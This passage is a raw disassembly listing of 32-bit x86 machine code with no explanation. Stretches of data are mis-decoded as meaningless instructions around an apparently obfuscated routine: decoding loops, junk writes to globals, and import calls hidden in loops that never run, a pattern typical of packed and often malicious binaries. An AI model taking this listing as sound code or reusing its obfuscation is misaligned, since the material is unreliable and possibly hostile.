  40c74d:	shr    DWORD PTR [eax],0x64
  40c750:	std    
  40c751:	nop
  40c752:	es aas 
  40c754:	retf   0xdc8f
  40c757:	(bad)  
  40c758:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c759:	aad    0x43
  40c75b:	dec    edi
  40c75c:	enter  0x3200,0xb4
  40c760:	jg     0x40c709
  40c762:	ficomp DWORD PTR [esi]
  40c764:	arpl   WORD PTR [ebx+0x6c],ax
  40c767:	xchg   ebx,eax
  40c768:	imul   esp,DWORD PTR [edx-0x54],0xef6d3345
  40c76f:	out    0x3c,al
  40c771:	dec    eax
  40c772:	or     DWORD PTR [esi+0x4e],edx
  40c775:	stc    
  40c776:	add    dh,BYTE PTR [ecx-0x6d]
  40c779:	add    DWORD PTR [esp+ebx*8],esi
  40c77c:	inc    dx
  40c77e:	lahf   
  40c77f:	outs   dx,DWORD PTR ds:[esi]
  40c780:	xchg   edi,eax
  40c781:	inc    esi
  40c782:	cmp    esp,DWORD PTR [ebx-0x3e]
  40c785:	ins    BYTE PTR es:[edi],dx
  40c786:	das    
  40c787:	(bad)  [edx-0x3]
  40c78a:	mov    edi,0x31919315
  40c78f:	imul   eax,DWORD PTR [ebp-0x31],0x71d4233b
  40c796:	or     DWORD PTR [ecx+0x67],0xc0efeb5b
  40c79d:	mov    esi,0xfef18007
  40c7a2:	xchg   ecx,eax
  40c7a3:	call   FWORD PTR [edx+ebx*8-0x28f9469]
  40c7aa:	out    0x9a,al
  40c7ac:	mov    bh,0x88
  40c7ae:	stc    
  40c7af:	adc    ah,BYTE PTR [esi-0x38]
  40c7b2:	jmp    0x509d:0x603c6aee
  40c7b9:	mov    bl,0xe0
  40c7bb:	mov    esp,0x8d5ad11b
  40c7c0:	jb     0x40c7bc
  40c7c2:	out    0x12,al
  40c7c4:	rol    ch,1
  40c7c6:	and    DWORD PTR [esi+0x3f7de608],edx
  40c7cc:	sub    DWORD PTR [edx-0x37a8af66],ebx
  40c7d2:	bound  ebx,QWORD PTR [edx]
  40c7d4:	dec    si
  40c7d6:	scas   al,BYTE PTR es:[edi]
  40c7d7:	jbe    0x40c778
  40c7d9:	je     0x40c75e
  40c7db:	call   0x4582b11f
  40c7e0:	pop    eax
  40c7e1:	in     al,dx
  40c7e2:	sar    BYTE PTR [edx+edi*1-0x2f],cl
  40c7e6:	lods   eax,DWORD PTR ds:[esi]
  40c7e7:	xchg   esi,eax
  40c7e8:	jge    0x40c7ac
  40c7ea:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40c7eb:	pop    ebp
  40c7ec:	pop    ebx
  40c7ed:	mov    esi,0x7545119b
  40c7f2:	lds    esi,FWORD PTR [esi]
  40c7f4:	(bad)  
  40c7f5:	jb     0x40c821
  40c7f7:	adc    BYTE PTR [ecx+edx*2+0x5cea5e80],bl
  40c7fe:	std    
  40c7ff:	bound  ebp,QWORD PTR [ebp+0x14949ec2]
  40c805:	mov    ch,0x3f
  40c807:	mov    ah,0xdb
  40c809:	test   BYTE PTR [eax+0x52845404],ah
  40c80f:	sub    BYTE PTR [ebp-0x5740798e],dh
  40c815:	sub    DWORD PTR [edx],esp
  40c817:	mov    dl,0x60
  40c819:	retf   0xbacb
  40c81c:	loop   0x40c829
  40c81e:	fisttp DWORD PTR [ecx]
  40c820:	pusha  
  40c821:	fld    TBYTE PTR ds:0xf226053
  40c827:	inc    ebp
  40c828:	pushf  
  40c829:	stos   BYTE PTR es:[edi],al
  40c82a:	jb     0x40c7cd
  40c82c:	mov    es,eax
  40c82e:	or     BYTE PTR [edi-0x5b],dh
  40c831:	xchg   edx,eax
  40c832:	inc    esi
  40c833:	es cld 
  40c835:	ffreep st(7)
  40c837:	stos   BYTE PTR es:[edi],al
  40c838:	or     DWORD PTR [esi-0x10dd9a0],ebx
  40c83e:	fst    DWORD PTR [ebx]
  40c840:	outs   dx,DWORD PTR ds:[esi]
  40c841:	call   0xaf2d736f
  40c846:	imul   ecx,eax,0x792129b
  40c84c:	sbb    edx,ebx
  40c84e:	adc    esi,DWORD PTR [esi+0x29e8aa39]
  40c854:	lea    edi,ds:0xadd8602c
  40c85a:	cmp    bl,BYTE PTR [edx]
  40c85c:	inc    edi
  40c85d:	in     al,dx
  40c85e:	jecxz  0x40c7f4
  40c860:	outs   dx,BYTE PTR ds:[esi]
  40c861:	or     al,0x41
  40c863:	call   0xbbf3aea9
  40c868:	sbb    eax,edx
  40c86a:	out    0x82,al
  40c86c:	push   0x3f
  40c86e:	imul   edi,DWORD PTR [esi-0x51],0x4bff15f4
  40c875:	loope  0x40c818
  40c877:	and    al,0x20
  40c879:	push   0x3892ae5a
  40c87e:	into   
  40c87f:	test   al,0x22
  40c881:	xchg   ebx,eax
  40c882:	jp     0x40c85f
  40c884:	push   eax
  40c885:	dec    edx
  40c886:	and    DWORD PTR [ecx-0x1b00ab4e],esi
  40c88c:	lods   eax,DWORD PTR ds:[esi]
  40c88d:	xchg   BYTE PTR [ebx+0x74],cl
  40c890:	leave  
  40c891:	fs into 
  40c893:	mov    edx,0x7d9598fd
  40c898:	or     ecx,edx
  40c89a:	int    0x29
  40c89c:	bnd jmp 0x40c836
  40c89f:	mov    ebx,0x3acb6429
  40c8a4:	cmp    eax,0xe0164bdd
  40c8a9:	das    
  40c8aa:	jno    0x40c8c6
  40c8ac:	pushf  
  40c8ad:	mov    cl,0xcd
  40c8af:	add    ecx,DWORD PTR [edi-0x41d4fdae]
  40c8b5:	mov    bl,0x72
  40c8b7:	mov    dh,0x47
  40c8b9:	dec    ecx
  40c8ba:	or     eax,0x4967164
  40c8bf:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40c8c1:	hlt    
  40c8c2:	and    BYTE PTR ds:0x295bfab0,0x55
  40c8c9:	xchg   esp,eax
  40c8ca:	lods   eax,DWORD PTR ds:[esi]
  40c8cb:	jecxz  0x40c8be
  40c8cd:	test   al,0xfe
  40c8d0:	ja     0x40c878
  40c8d2:	enter  0x9250,0x75
  40c8d6:	popa   
  40c8d7:	outs   dx,DWORD PTR ds:[esi]
  40c8d8:	test   eax,0x4cd5feb9
  40c8dd:	add    eax,0x821a42c3
  40c8e2:	xchg   esp,eax
  40c8e3:	inc    ebp
  40c8e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40c8e5:	xor    BYTE PTR fs:[eax+eax*1+0x16],cl
  40c8ea:	xor    DWORD PTR [ebx],ebp
  40c8ec:	ror    dh,cl
  40c8ee:	mov    bh,0xf2
  40c8f0:	fidiv  WORD PTR [ebx]
  40c8f2:	xor    ebp,DWORD PTR [eax+0xabd0648]
  40c8f8:	cs mov eax,esp
  40c8fb:	loop   0x40c8eb
  40c8fd:	imul   esi,esp,0x2f
  40c900:	mov    BYTE PTR [edi+edx*4-0x3],bl
  40c904:	mov    eax,0x826155a0
  40c909:	adc    BYTE PTR [ebx-0x61ac7d9d],0x8
  40c910:	(bad)  
  40c911:	div    BYTE PTR [edi]
  40c913:	std    
  40c914:	rcl    DWORD PTR [eax+0xa],0x5b
  40c918:	jne    0x40c8c1
  40c91a:	mov    bh,0x49
  40c91c:	les    esp,FWORD PTR [eax+0x70794f78]
  40c922:	mov    esp,0x5184215d
  40c927:	(bad)  
  40c928:	test   al,0xdb
  40c92a:	rol    ecx,cl
  40c92c:	pop    eax
  40c92d:	cwde   
  40c92e:	jp     0x40c903
  40c930:	icebp  
  40c931:	ins    BYTE PTR es:[edi],dx
  40c932:	fs jp  0x40c930
  40c935:	jge    0x40c939
  40c937:	adc    eax,0x6a88f2ba
  40c93c:	(bad)  
  40c93d:	or     BYTE PTR [edi+0x42dc688d],0xf2
  40c944:	pop    DWORD PTR [edx-0x64f77ef8]
  40c94a:	lock sub bh,BYTE PTR [esi+0x71c4f9c4]
  40c951:	adc    eax,DWORD PTR ds:0x654e0abf
  40c957:	inc    esi
  40c958:	inc    ecx
  40c959:	cmp    dh,bh
  40c95b:	xor    al,0x1d
  40c95d:	xor    eax,0xf845c7f4
  40c962:	mov    cl,0x85
  40c964:	pushf  
  40c965:	clc    
  40c966:	xor    DWORD PTR ds:0x413d34,0x2984
  40c970:	mov    ecx,DWORD PTR [ebp-0x14]
  40c973:	and    DWORD PTR ds:0x413d24,0x0
  40c97d:	jmp    0x40c990
  40c982:	xor    eax,eax
  40c984:	or     eax,DWORD PTR ds:0x413d24
  40c98a:	inc    eax
  40c98b:	mov    ds:0x413d24,eax
  40c990:	cmp    DWORD PTR ds:0x413d24,0x18
  40c997:	jae    0x40ca0e
  40c99d:	cmp    DWORD PTR ds:0x413d24,0x20
  40c9a4:	jne    0x40c9bd
  40c9aa:	push   0x738d
  40c9af:	push   0x6edb
  40c9b4:	push   DWORD PTR [ebp-0x18]
  40c9b7:	call   DWORD PTR ds:0x416768
  40c9bd:	jmp    0x40c982
  40c9c2:	mov    DWORD PTR ds:0x413c1e,0x1e
  40c9cc:	cmp    DWORD PTR ds:0x413c1e,0x0
  40c9d3:	je     0x40ca0e
  40c9d9:	cmp    DWORD PTR ds:0x413c1e,0x2c
  40c9e0:	jne    0x40c9fe
  40c9e6:	push   0x25a0
  40c9eb:	push   0x413ce4
  40c9f0:	push   0x3cd5
  40c9f5:	push   DWORD PTR [ebp-0x18]
  40c9f8:	call   DWORD PTR ds:0x416770
  40c9fe:	mov    eax,ds:0x413c1e
  40ca03:	dec    eax
  40ca04:	mov    ds:0x413c1e,eax
  40ca09:	jmp    0x40c9cc
  40ca0e:	push   esi
  40ca0f:	sbb    DWORD PTR ds:0x413ce4,0x7973
  40ca19:	mov    eax,0x7510894
  40ca1e:	and    DWORD PTR ds:0x413c1e,0x0
  40ca28:	jmp    0x40ca3a
  40ca2d:	mov    esi,DWORD PTR ds:0x413c1e
  40ca33:	inc    esi
  40ca34:	mov    DWORD PTR ds:0x413c1e,esi
  40ca3a:	cmp    DWORD PTR ds:0x413c1e,0x15
  40ca41:	jae    0x40ca74
  40ca47:	cmp    DWORD PTR ds:0x413c1e,0x1f
  40ca4e:	jne    0x40ca6e
  40ca54:	push   0x413c12
  40ca59:	push   0x88a1
  40ca5e:	push   0x416000
  40ca63:	push   0x416152
  40ca68:	call   DWORD PTR ds:0x416774
  40ca6e:	jmp    0x40ca2d
  40ca73:	inc    esi
  40ca74:	xor    ecx,eax
  40ca76:	sub    esi,DWORD PTR ds:0x413c70
  40ca7c:	mov    esi,0x3272dc
  40ca81:	mov    DWORD PTR ds:0x413c80,0x12bb
  40ca8b:	push   edi
  40ca8c:	xor    DWORD PTR ds:0x413ce4,0x413c6c
  40ca96:	add    ecx,esi
  40ca98:	jmp    0x40cab4
  40ca9d:	mov    dl,BYTE PTR [ebp-0x1]
  40caa0:	not    DWORD PTR ds:0x41400c
  40caa6:	mov    BYTE PTR [ebp+ecx*1-0xa4],dl
  40caad:	not    DWORD PTR ds:0x413ce8
  40cab3:	inc    ecx
  40cab4:	cmp    ecx,0x40
  40cab7:	mov    DWORD PTR ds:0x413d24,0x3f58
  40cac1:	jb     0x40ca9d
  40cac7:	adc    edx,0x503d
  40cacd:	mov    edx,DWORD PTR [ebp-0x14]
  40cad0:	xor    edx,eax
  40cad2:	add    edx,esi
  40cad4:	jmp    0x40cc01
  40cad9:	and    DWORD PTR ds:0x413c0a,0x1a66
  40cae3:	mov    edi,DWORD PTR [ebp+0x8]
  40cae6:	and    ecx,0xcf4
  40caec:	mov    ecx,0x8a87
  40caf1:	adc    DWORD PTR ds:0x413c12,0x413d
  40cafb:	xor    cx,WORD PTR [edi+edx*4+0x2]
  40cb00:	and    DWORD PTR ds:0x41401c,0x0
  40cb0a:	mov    edi,DWORD PTR ds:0x41401c
  40cb10:	inc    edi
  40cb11:	mov    DWORD PTR ds:0x41401c,edi
  40cb17:	cmp    DWORD PTR ds:0x41401c,0x5
  40cb1e:	jne    0x40cb39
  40cb24:	push   0x6acf
  40cb29:	push   0x413cf4
  40cb2e:	push   0x416152
  40cb33:	call   DWORD PTR ds:0x416778
  40cb39:	cmp    DWORD PTR ds:0x41401c,0x4
  40cb40:	jne    0x40cb53
  40cb46:	mov    edi,DWORD PTR ds:0x41401c
  40cb4c:	inc    edi
  40cb4d:	mov    DWORD PTR ds:0x41401c,edi
  40cb53:	cmp    DWORD PTR ds:0x41401c,0x1b
  40cb5a:	jb     0x40cb0a
  40cb60:	mov    DWORD PTR ds:0x414018,0x15
  40cb6a:	cmp    DWORD PTR ds:0x414018,0x0
  40cb71:	je     0x40cbab
  40cb77:	cmp    DWORD PTR ds:0x414018,0x1b
  40cb7e:	jne    0x40cb8f
  40cb84:	push   0x4160b3
  40cb89:	call   DWORD PTR ds:0x41677c
  40cb8f:	mov    edi,DWORD PTR ds:0x414018
  40cb95:	dec    edi
  40cb96:	mov    DWORD PTR ds:0x414018,edi
  40cb9c:	jmp    0x40cb6a
  40cba1:	xor    DWORD PTR ds:0x414008,0x3196
  40cbab:	mov    edi,0x3b4a
  40cbb0:	add    cx,di
  40cbb3:	sbb    DWORD PTR ds:0x414000,0x24d3
  40cbbd:	movzx  ecx,cx
  40cbc0:	xor    DWORD PTR ds:0x413bfe,0x413c06
  40cbca:	mov    DWORD PTR [ebp-0x10],ecx
  40cbcd:	neg    DWORD PTR ds:0x413c0e
  40cbd3:	mov    ecx,DWORD PTR [ebp+0x8]
  40cbd6:	or     DWORD PTR ds:0x413d20,0x3470
  40cbe0:	movzx  ecx,WORD PTR [ecx+edx*4]
  40cbe4:	xor    DWORD PTR ds:0x413d30,0x413bf6
  40cbee:	xor    ecx,0x8a87
  40cbf4:	add    ecx,edi
  40cbf6:	mov    edi,DWORD PTR [ebp-0x10]
  40cbf9:	mov    BYTE PTR [ebp+edi*1-0xa4],cl
  40cc00:	inc    edx
  40cc01:	mov    ecx,DWORD PTR [ebp-0x18]
  40cc04:	cmp    edx,ecx
  40cc06:	mov    DWORD PTR ds:0x414010,0x5811
  40cc10:	jne    0x40cad9
  40cc16:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc19:	mov    DWORD PTR ds:0x413d1c,0x410a
  40cc23:	mov    edx,DWORD PTR [ebp+0x10]
  40cc26:	dec    DWORD PTR ds:0x413cec
  40cc2c:	xor    ecx,eax
  40cc2e:	add    ecx,esi
  40cc30:	and    DWORD PTR ds:0x413c0a,0x5ecf
  40cc3a:	mov    DWORD PTR [edx],ecx
  40cc3c:	dec    ecx
  40cc3d:	mov    ecx,DWORD PTR [ebp-0x14]
  40cc40:	xor    ecx,eax
  40cc42:	and    DWORD PTR ds:0x413bf6,0x413c84
  40cc4c:	add    ecx,esi
  40cc4e:	mov    DWORD PTR ds:0x413c0a,0x45cc
  40cc58:	mov    DWORD PTR [ebp-0x20],ecx
  40cc5b:	not    ecx
  40cc5d:	mov    DWORD PTR [ebp+0x8],0xf89c85b0
  40cc64:	mov    DWORD PTR [ebp-0xc],0xf89c85a0
  40cc6b:	mov    DWORD PTR [ebp-0x1c],0xf89c95b0
  40cc72:	mov    DWORD PTR ds:0x413c6c,edi
  40cc78:	mov    ecx,DWORD PTR [ebp-0xc]
  40cc7b:	mov    DWORD PTR ds:0x413c84,0x129c
  40cc85:	mov    DWORD PTR [ebp+0x8],ecx
  40cc88:	jmp    0x40ce75
  40cc8d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cc90:	add    edx,DWORD PTR ds:0x413c80
  40cc96:	mov    edx,DWORD PTR [ebp-0x8]
  40cc99:	and    DWORD PTR ds:0x413c74,0x413d20
  40cca3:	xor    ecx,eax
  40cca5:	xor    edx,eax
  40cca7:	sub    ecx,edx
  40cca9:	sub    ecx,esi
  40ccab:	xor    ecx,eax
  40ccad:	and    DWORD PTR ds:0x413c1a,0x0
  40ccb7:	mov    edx,DWORD PTR ds:0x413c1a
  40ccbd:	inc    edx
  40ccbe:	mov    DWORD PTR ds:0x413c1a,edx
  40ccc4:	cmp    DWORD PTR ds:0x413c1a,0x9
  40cccb:	jne    0x40cce4
  40ccd1:	push   0x413bfe
  40ccd6:	push   DWORD PTR [ebp-0x20]
  40ccd9:	push   0x4160ed
  40ccde:	call   DWORD PTR ds:0x416780
  40cce4:	cmp    DWORD PTR ds:0x413c1a,0x8
  40cceb:	jne    0x40ccfe
  40ccf1:	mov    edx,DWORD PTR ds:0x413c1a
  40ccf7:	inc    edx
  40ccf8:	mov    DWORD PTR ds:0x413c1a,edx
  40ccfe:	cmp    DWORD PTR ds:0x413c1a,0x10
  40cd05:	jb     0x40ccb7
  40cd0b:	mov    DWORD PTR [ebp+0x8],ecx
  40cd0e:	adc    ecx,ecx
  40cd10:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd13:	mov    DWORD PTR ds:0x413c16,0x3405
  40cd1d:	mov    edx,DWORD PTR [ebp-0x64]
  40cd20:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd27:	mov    DWORD PTR [ebp-0x64],ecx
  40cd2a:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd2d:	mov    edx,DWORD PTR [ebp-0x60]
  40cd30:	lea    ecx,[edx+ecx*1+0x5708f1]
  40cd37:	movzx  edx,WORD PTR ds:0x413d20
  40cd3e:	sbb    edx,DWORD PTR ds:0x413d28
  40cd44:	mov    DWORD PTR ds:0x413d20,edx
  40cd4a:	mov    DWORD PTR [ebp-0x60],ecx
  40cd4d:	and    DWORD PTR ds:0x414000,0x413d1c
  40cd57:	mov    ecx,DWORD PTR [ebp+0x8]
  40cd5a:	add    DWORD PTR ds:0x413c78,ebx
  40cd60:	mov    edx,DWORD PTR [ebp-0x5c]
  40cd63:	neg    DWORD PTR ds:0x413c02
  40cd69:	lea    ecx,[edx+ecx*1+0x5708f2]
  40cd70:	and    DWORD PTR ds:0x413d20,0x0
  40cd7a:	mov    edx,DWORD PTR ds:0x413d20
  40cd80:	inc    edx
  40cd81:	mov    DWORD PTR ds:0x413d20,edx
  40cd87:	cmp    DWORD PTR ds:0x413d20,0xa
  40cd8e:	jne    0x40cda2
  40cd94:	push   0x413d34
  40cd99:	push   DWORD PTR [ebp-0x24]
  40cd9c:	call   DWORD PTR ds:0x416784
  40cda2:	cmp    DWORD PTR ds:0x413d20,0x9
  40cda9:	jne    0x40cdbe
  40cdaf:	xor    edx,edx
  40cdb1:	add    edx,DWORD PTR ds:0x413d20
  40cdb7:	inc    edx
  40cdb8:	mov    DWORD PTR ds:0x413d20,edx
  40cdbe:	cmp    DWORD PTR ds:0x413d20,0x15
  40cdc5:	jb     0x40cd7a
  40cdcb:	or     DWORD PTR ds:0x413ce8,0x2ce1
  40cdd5:	mov    DWORD PTR [ebp-0x5c],ecx
  40cdd8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cddb:	add    DWORD PTR ds:0x413c1e,ecx
  40cde1:	mov    edx,DWORD PTR [ebp-0x58]
  40cde4:	lea    ecx,[edx+ecx*1+0x5708f3]
  40cdeb:	add    DWORD PTR ds:0x413bfe,ebx
  40cdf1:	mov    DWORD PTR [ebp-0x58],ecx
  40cdf4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cdf7:	or     DWORD PTR ds:0x413c80,0x1524
  40ce01:	mov    edx,DWORD PTR [ebp-0x54]
  40ce04:	lea    ecx,[edx+ecx*1+0x5708fc]
  40ce0b:	adc    edx,DWORD PTR ds:0x41400c
  40ce11:	mov    DWORD PTR [ebp-0x54],ecx
  40ce14:	and    DWORD PTR ds:0x413d20,0x0
  40ce1e:	mov    edx,DWORD PTR ds:0x413d20
  40ce24:	inc    edx
  40ce25:	mov    DWORD PTR ds:0x413d20,edx
  40ce2b:	cmp    DWORD PTR ds:0x413d20,0x12
  40ce32:	jne    0x40ce48
  40ce38:	push   0x8060
  40ce3d:	push   0x41608d
  40ce42:	call   DWORD PTR ds:0x41678c
  40ce48:	cmp    DWORD PTR ds:0x413d20,0x10
  40ce4f:	jb     0x40ce1e
  40ce55:	mov    ecx,DWORD PTR [ebp+0x8]
  40ce58:	sbb    edx,DWORD PTR ds:0x413c0e
  40ce5e:	mov    edx,DWORD PTR [ebp-0x50]
  40ce61:	sbb    DWORD PTR ds:0x413cf4,0x413c16
  40ce6b:	lea    ecx,[edx+ecx*1+0x5708fd]
  40ce72:	mov    DWORD PTR [ebp-0x50],ecx
  40ce75:	and    DWORD PTR ds:0x413c12,0x0
  40ce7f:	mov    ecx,DWORD PTR ds:0x413c12
  40ce85:	inc    ecx
  40ce86:	mov    DWORD PTR ds:0x413c12,ecx
  40ce8c:	cmp    DWORD PTR ds:0x413c12,0x1d
  40ce93:	jne    0x40ceb7
  40ce99:	push   DWORD PTR [ebp-0x20]
  40ce9c:	push   0x413c70
  40cea1:	push   0x4dec
  40cea6:	push   0x4160bf
  40ceab:	push   DWORD PTR [ebp-0x20]
  40ceae:	push   DWORD PTR [ebp-0x10]
  40ceb1:	call   DWORD PTR ds:0x416790
  40ceb7:	cmp    DWORD PTR ds:0x413c12,0x11
  40cebe:	jb     0x40ce7f
  40cec4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cec7:	xor    ecx,eax
  40cec9:	add    ecx,esi
  40cecb:	jne    0x40cc8d
  40ced1:	jmp    0x40f43d
  40ced6:	mov    ecx,DWORD PTR [ebp-0x1c]
  40ced9:	mov    edx,DWORD PTR [ebp-0x8]
  40cedc:	xor    ecx,eax
  40cede:	xor    edx,eax
  40cee0:	sub    ecx,edx
  40cee2:	sub    ecx,esi
  40cee4:	xor    ecx,eax
  40cee6:	mov    DWORD PTR [ebp-0x1c],ecx
  40cee9:	mov    ecx,DWORD PTR [ebp-0xc]
  40ceec:	mov    DWORD PTR [ebp+0x8],ecx
  40ceef:	jmp    0x40cf21
  40cef4:	mov    ecx,DWORD PTR [ebp+0x8]
  40cef7:	mov    edx,DWORD PTR [ebp-0x8]
  40cefa:	xor    ecx,eax
  40cefc:	xor    edx,eax
  40cefe:	sub    ecx,edx
  40cf00:	sub    ecx,esi
  40cf02:	xor    ecx,eax
  40cf04:	mov    DWORD PTR [ebp+0x8],ecx
  40cf07:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf0a:	mov    edx,DWORD PTR [ebp+0x8]
  40cf0d:	imul   edx,edx,0x5708f1
  40cf13:	xor    ecx,eax
  40cf15:	add    ecx,esi
  40cf17:	lea    ecx,[ebp+ecx*4-0x64]
  40cf1b:	mov    edi,DWORD PTR [ecx]
  40cf1d:	add    edx,edi
  40cf1f:	mov    DWORD PTR [ecx],edx
  40cf21:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf24:	xor    ecx,eax
  40cf26:	add    ecx,esi
  40cf28:	jne    0x40cef4
  40cf2e:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf31:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf38:	mov    dl,BYTE PTR [ebp-0x1]
  40cf3b:	cmp    cl,dl
  40cf3d:	je     0x40f39e
  40cf43:	mov    ecx,DWORD PTR [ebp-0x20]
  40cf46:	mov    cl,BYTE PTR [ebp+ecx*1-0xa4]
  40cf4d:	mov    edx,DWORD PTR [ebp+0xc]
  40cf50:	cmp    cl,BYTE PTR [edx]
  40cf52:	jne    0x40f44f
  40cf58:	mov    ecx,DWORD PTR [ebp-0x14]
  40cf5b:	mov    edx,DWORD PTR [ebp+0xc]
  40cf5e:	movsx  edx,BYTE PTR [edx]
  40cf61:	xor    ecx,eax
  40cf63:	add    ecx,esi
  40cf65:	cmp    edx,ecx
  40cf67:	mov    ecx,DWORD PTR [ebp-0xc]
  40cf6a:	mov    DWORD PTR [ebp+0x8],ecx
  40cf6d:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf70:	je     0x411851
  40cf76:	jmp    0x40cfab
  40cf7b:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf7e:	mov    edx,DWORD PTR [ebp-0x8]
  40cf81:	xor    ecx,eax
  40cf83:	xor    edx,eax
  40cf85:	sub    ecx,edx
  40cf87:	sub    ecx,esi
  40cf89:	xor    ecx,eax
  40cf8b:	mov    DWORD PTR [ebp+0x8],ecx
  40cf8e:	mov    ecx,DWORD PTR [ebp+0x8]
  40cf91:	mov    edx,DWORD PTR [ebp+0x8]
  40cf94:	xor    ecx,eax
  40cf96:	imul   edx,edx,0x5708f1
  40cf9c:	add    ecx,esi
  40cf9e:	lea    ecx,[ebp+ecx*4-0x64]
  40cfa2:	mov    edi,DWORD PTR [ecx]
  40cfa4:	add    edx,edi
  40cfa6:	mov    DWORD PTR [ecx],edx
  40cfa8:	mov    ecx,DWORD PTR [ebp+0x8]
  40cfab:	xor    ecx,eax
  40cfad:	add    ecx,esi
  40cfaf:	jne    0x40cf7b
  40cfb5:	mov    ecx,DWORD PTR [ebp-0x14]
  40cfb8:	mov    edx,DWORD PTR [ebp+0x8]
  40cfbb:	xor    ecx,eax
  40cfbd:	xor    edx,eax
  40cfbf:	add    ecx,esi
  40cfc1:	add    edx,esi
  40cfc3:	cmp    ecx,edx
  40cfc5:	jae    0x40f3e3
  40cfcb:	lea    edx,[ecx-0x3272dc]
  40cfd1:	mov    DWORD PTR [ebp-0x18],edx
  40cfd4:	mov    edi,DWORD PTR [ebp-0x18]
  40cfd7:	mov    DWORD PTR [ebp-0x24],0x705fd0e
  40cfde:	lea    edx,[ebp-0x24]
  40cfe1:	mov    DWORD PTR [ebp-0x10],edx
  40cfe4:	mov    edx,DWORD PTR [ebp-0x10]
  40cfe7:	add    DWORD PTR [edx],0x705fa0e
  40cfed:	mov    ebx,DWORD PTR [ebp-0x10]
  40cff0:	xor    edi,eax
  40cff2:	add    edi,DWORD PTR [ebx]
  40cff4:	lea    edx,[ebp+ecx*4-0x64]
  40cff8:	jmp    0x40f380
  40cffd:	sar    BYTE PTR [ebx-0x74043cf0],1
  40d003:	jae    0x40cfc0
  40d005:	dec    ebp
  40d006:	bound  esi,QWORD PTR [eax-0x5db1f1a3]
  40d00c:	div    DWORD PTR [edx+0x77c7ce9]
  40d012:	pop    edi
  40d013:	jl     0x40d091
  40d015:	aas    
  40d016:	aad    0x37
  40d018:	mov    ch,0x5b
  40d01a:	out    0x98,al
  40d01c:	jg     0x40cfb6
  40d01e:	push   esi
  40d01f:	xchg   esi,eax
  40d020:	nop
  40d021:	jecxz  0x40d018
  40d023:	frstor [ecx]
  40d025:	inc    ebx
  40d026:	mov    eax,0x7557469e
  40d02b:	call   0x5b876cf9
  40d030:	sti    
  40d031:	sar    dl,1
  40d033:	js     0x40d08d
  40d035:	mov    al,0x14
  40d037:	dec    ecx
  40d038:	lock ds sbb al,0x54
  40d03c:	inc    edx
  40d03d:	rsqrtps xmm4,XMMWORD PTR [ebx]
  40d040:	xchg   ebx,eax
  40d041:	mov    dl,0x1d
  40d043:	xchg   BYTE PTR [esp+eiz*4],dl
  40d046:	mov    dh,0x56
  40d048:	cmc    
  40d049:	xchg   edi,eax
  40d04a:	test   al,0xd6
  40d04c:	push   es
  40d04d:	mov    ds:0x51f3bba2,eax
  40d052:	cmp    al,0xfd
  40d054:	into   
  40d055:	mov    ds:0xc32936c6,eax
  40d05a:	into   
  40d05b:	mov    ch,0x10
  40d05d:	pusha  
  40d05e:	outs   dx,DWORD PTR ds:[esi]
  40d05f:	mov    dh,BYTE PTR [eax]
  40d061:	xor    esi,ebp
  40d063:	jae    0x40d0a9
  40d065:	jge    0x40d0b7
  40d067:	sbb    al,BYTE PTR [esi-0x17]
  40d06a:	shl    ebx,0x9c
  40d06d:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  40d06f:	fldcw  WORD PTR [edi+0x46]
  40d072:	ins    BYTE PTR es:[edi],dx
  40d073:	stos   DWORD PTR es:[edi],eax
  40d074:	test   DWORD PTR [ecx+edx*1+0x53102fd8],edx
  40d07b:	inc    ebp
  40d07c:	jmp    FWORD PTR [ecx+0x39]
  40d07f:	cmp    BYTE PTR [edx],bl
  40d081:	cmp    ch,cl
  40d083:	xor    eax,0x756894f5
  40d088:	in     al,0x56
  40d08a:	(bad)  
  40d08b:	sar    DWORD PTR [esi+0x492181a7],cl
  40d091:	(bad)  
  40d092:	fisttp DWORD PTR [edx+0x21f4c018]
  40d098:	cmp    DWORD PTR [edi+0x6e],eax
  40d09b:	sbb    eax,0x803d21e4
  40d0a0:	aam    0x9
  40d0a2:	pop    ds
  40d0a3:	cmp    ebx,0x46d593f7
  40d0a9:	repnz call 0x6e90:0x2a810f3e
  40d0b1:	push   ss
  40d0b2:	push   0xfcf049be
  40d0b7:	xor    BYTE PTR [esi+0x6b40bd47],ah
  40d0bd:	imul   esp,DWORD PTR [edx-0x1f],0xffffffb5
  40d0c1:	lods   eax,DWORD PTR ds:[esi]
  40d0c2:	jp     0x40d0b1
  40d0c4:	xchg   esi,eax
  40d0c5:	hlt    
  40d0c6:	jg     0x40d0ab
  40d0c8:	js     0x40d0ac
  40d0ca:	push   edi
  40d0cb:	fisttp DWORD PTR [edx]
  40d0cd:	ja     0x40d13b
  40d0cf:	ja     0x40d0e1
  40d0d1:	mov    ch,BYTE PTR [ebx]
  40d0d3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40d0d4:	fst    st(0)
  40d0d6:	sub    esi,DWORD PTR [ebx+edx*1+0xf]
  40d0da:	fcom   QWORD PTR [ebp+0x27570342]
  40d0e0:	nop
  40d0e1:	lahf   
  40d0e2:	or     ebx,DWORD PTR [edi-0x6d8fed5d]
  40d0e8:	cmp    dl,BYTE PTR [edx-0x56259b30]
  40d0ee:	jns    0x40d0d3
  40d0f0:	fild   WORD PTR [eax-0x3e4d34a3]
  40d0f6:	and    al,0x13
  40d0f8:	imul   esi,DWORD PTR [ecx],0xffffff85
  40d0fb:	dec    edi
  40d0fc:	mov    edx,0xd544b3d5
  40d101:	outs   dx,BYTE PTR ds:[esi]
  40d102:	push   eax
